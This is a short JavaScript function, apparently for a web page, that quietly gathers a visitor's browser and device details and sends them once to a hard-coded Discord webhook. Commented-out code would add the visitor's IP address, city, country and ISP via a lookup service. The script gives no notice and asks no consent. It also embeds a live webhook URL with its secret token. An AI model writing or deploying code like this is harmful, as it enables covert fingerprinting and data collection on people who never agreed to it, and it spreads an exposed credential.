async function sendInfo() {
    console.log("11")
    browser_saved = localStorage.getItem("browser_saved");
    if (browser_saved === "true") {
        return;
    }

    // Get IP info
    // const ipData = await fetch("https://ipapi.co/json/")
    //     .then(r => r.json());

    // Browser info
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory || "Not supported",

        screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth
        },

        // ip: ipData.ip,
        // city: ipData.city,
        // country: ipData.country_name,
        // isp: ipData.org
    };

    // Format message
    let msg = "🖥️ **PC / Browser Info**\n\n";

    for (let key in info) {
        if (typeof info[key] === "object") {
            msg += `**${key}:** ${JSON.stringify(info[key])}\n`;
        } else {
            msg += `**${key}:** ${info[key]}\n`;
        }
    }

    const WEBHOOK = "https://discord.com/api/webhooks/1464929767408009339/za-H_zBBvREviInRSbSI1UMQ0wSNOwAZf_NXgTPlKQpuM7gdOpGwucUT0ZpmGqj2ueTs";
    const THREAD_ID = "1464925082903117923";

    const url = `${WEBHOOK}?thread_id=${THREAD_ID}`;

    const res = await fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: msg
        })
    });

    if (res.ok) {
        localStorage.setItem("browser_saved", "true");
    }
}
